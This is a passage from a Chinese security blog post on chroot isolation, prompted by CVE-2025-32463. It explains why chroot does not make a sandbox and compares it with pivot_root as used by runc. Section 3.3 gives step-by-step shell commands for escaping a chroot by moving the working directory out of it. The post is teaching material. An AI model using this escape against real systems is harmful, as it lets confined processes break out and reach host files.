<p>正如 <code>chroot</code> 的手册所说的那样，若我们没有追加任何命令，那么它会使用 <code>$SHELL</code> 的值。如图 39 所示，<code>$SHELL</code>  的值在我们的 Ubuntu 主机上已经被设置为 <code>/bin/bash</code> 了，<code>chroot</code> 的子进程会继承这个环境变量，继续寻找<code>/bin/bash</code> ，但 Alpine 并没有这个文件，所以命令执行失败。</p>
<p><img src="/image/image_dxmCBrfNGX.png" srcset="/img/loading.gif" lazyload alt="图 39：chroot 环境会继承原来的 $SHELL 和 $PATH，因此无法找到对应的文件" title="图 39：chroot 环境会继承原来的 $SHELL 和 $PATH，因此无法找到对应的文件"></p>
<p>此外，若我们想执行 <code>ls</code> 等常见的可执行文件，也无需显示地指定其路径。因为在主机和 <code>chroot</code> 环境中，<code>PATH</code> 的值并未被改变。只不过在 <code>chroot</code> 环境中，<code>alpine</code> 根目录中的 <code>bin</code> 目录被解析成了新进程的 <code>/bin</code> 目录，该目录已包含了 <code>ls</code> 等常见的可执行文件，</p>
<p><img src="/image/image_GJouvfQyMF.png" srcset="/img/loading.gif" lazyload alt="图 40：Alpine 的 chroot 环境中存在的文件" title="图 40：Alpine 的 chroot 环境中存在的文件"></p>
<p>需要注意的是，只有子进程才会获得新的根目录，在图 41 的例子中，指的是运行 <code>ls</code>、<code>sh</code> 和 <code>cat</code> 这些进程。只有执行 <code>exit</code> 结束 <code>sh</code> 进程后，控制权才会返还给父进程。</p>
<p><img src="/image/image_LDVxLo4-Rm.png" srcset="/img/loading.gif" lazyload alt="图 41：只有退出 chroot 环境，控制器才会返回给父进程" title="图 41：只有退出 chroot 环境，控制器才会返回给父进程"></p>
<p>从上面的例子中，我们发现 <code>chroot</code> 只会改变路径解析过程，而不会做其它任何事情，因此它不适合沙箱化一个进程，因为它也不会限制文件系统的系统调用。这也是<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/chroot.2.html" title="《chroot(2) — Linux manual page》">《chroot(2) — Linux manual page》</a>明确指出的事情。</p>
<p><img src="/image/image_DG6iu7M3JO.png" srcset="/img/loading.gif" lazyload alt="图 42：chroot 不适合完全沙箱化一个进程" title="图 42：chroot 不适合完全沙箱化一个进程"></p>
<h3 id="3-3-风险二：chroot-越狱"><a href="#3-3-风险二：chroot-越狱" class="headerlink" title="3.3 风险二：chroot 越狱"></a>3.3 风险二：chroot 越狱</h3><p>在过去的系统中，守护进程为了提高安全性，会使用 <code>chroot</code> 来限制自己访问的文件系统的范围。但如果一个文件夹被移出了 <code>chroot</code> 环境，那么攻击者可以利用这一点来进行越狱。我们来举个最简单的例子：</p>
<ol>
<li><p>打开一个终端，进入 <code>alpine</code> 的 <code>chroot</code> 环境中；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chroot</span> alpine sh<br></code></pre></td></tr></table></figure>
</li>
<li><p>创建一个新的目录 <code>will_be_move</code>，并将其设置为当前工作目录；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> will_be_move <br><span class="hljs-built_in">chdir</span> will_be_move<br></code></pre></td></tr></table></figure>
</li>
<li><p>然后，打开一个新的终端，将 <code>will_be_move</code>目录移出<code>chroot</code>环境中；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> alpine/will_be_move ./<br></code></pre></td></tr></table></figure>
</li>
<li><p>这样，我们就逃逸到主机环境中了，并且可以通过 <code>…/</code>来查看主机上的文件。</p>
</li>
</ol>
<p><img src="/image/image_EAbock-kFB.png" srcset="/img/loading.gif" lazyload alt="图 43：chroot 越狱" title="图 43：chroot 越狱"></p>
<h3 id="3-4-pivot-root-系统调用"><a href="#3-4-pivot-root-系统调用" class="headerlink" title="3.4 pivot_root 系统调用"></a>3.4 <code>pivot_root</code> 系统调用</h3><p>除了我们熟悉的<code>chroot</code>，还有一个类似的系统调用叫做<code>pivot_root</code>。这两者的目标其实是一样的：给容器一个“自己的根目录”，就像我们把容器放在一个独立的小世界里。</p>
<p>在今天的分享中，我们选择用大家更熟悉的<code>chroot</code>来做演示，因为它更容易理解。但请记住，无论是<code>chroot</code>还是<code>pivot_root</code>，核心目的都是让容器有一套独立的根文件系统，只是实现方式不同。</p>
<p>简单来说，<code>pivot_root</code> 可以把当前的根目录挪到一个叫<code>put_old</code> 的临时目录里，然后把新的目录<code>new_root</code> 设置为整个系统的新“地基”。这样一来，进程看到的根目录就完全变了。需要注意的是：<code>new_root</code>和<code>put_old</code> 不能是同一个文件系统中的目录，这样做是为了避免混乱和安全问题。</p>
<p><code>chroot</code> 更像是“换个窗户看世界”，而 <code>pivot_root</code> 是“连地基一起搬家”。所以在真正的容器环境里，比如 Docker 或 Kubernetes 后面的底层运行时，大家更倾向于使用<code>pivot_root</code> 来设置容器的根文件系统，因为这样更安全、更彻底。</p>
<p>以 <a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/blob/34c64e2a7f0695ac300bb4f1cb9375172b889148/libcontainer/rootfs_linux.go#L210" title="runc">runc</a> 为例，我们在查看其源代码的时候，就发现它使用的是 <code>pivot_root</code> 而不是 <code>chroot</code>。因为绝大多数情况下 <code>config.Namespaces.Contains(configs.NEWNS)</code>的值为 <code>true</code>，因为容器运行时的默认行为就是启用挂载命名空间（mount namespace）。这时候就可以放心使用<code>pivot_root</code> 去彻底换根，而不会影响其他进程。</p>
<p><img src="/image/image_QA7YDCrzgQ.png" srcset="/img/loading.gif" lazyload alt="图 44：runc 准备根文件系统的核心代码" title="图 44：runc 准备根文件系统的核心代码"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" class="print-no-link">#容器安全</a>
      
        <a href="/tags/CVE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#CVE 漏洞分析</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>从 CVE-2025-32463 谈及 chroot 的容器隔离安全性</div>
      <div>http://example.com/2025/07/30/从-CVE-2025-32463-谈及-chroot-的容器隔离安全性/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Yaney</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年7月30日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/07/30/%E5%A6%82%E4%BD%95%E5%83%8F%E9%AB%98%E6%89%8B%E4%B8%80%E6%A0%B7%E6%8F%90%E9%97%AE/" title="如何像高手一样提问">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">如何像高手一样提问</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/07/03/WIZ-2025%E7%AB%9E%E6%A0%87%E8%B5%9B-%E7%AC%AC%E4%B8%80%E6%9C%9F-June/" title="WIZ-2025 竞标赛 - 第一期 (June)">
                        <span class="hidden-mobile">WIZ-2025 竞标赛 - 第一期 (June)</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark-orange';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'y4ney/y4ney.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
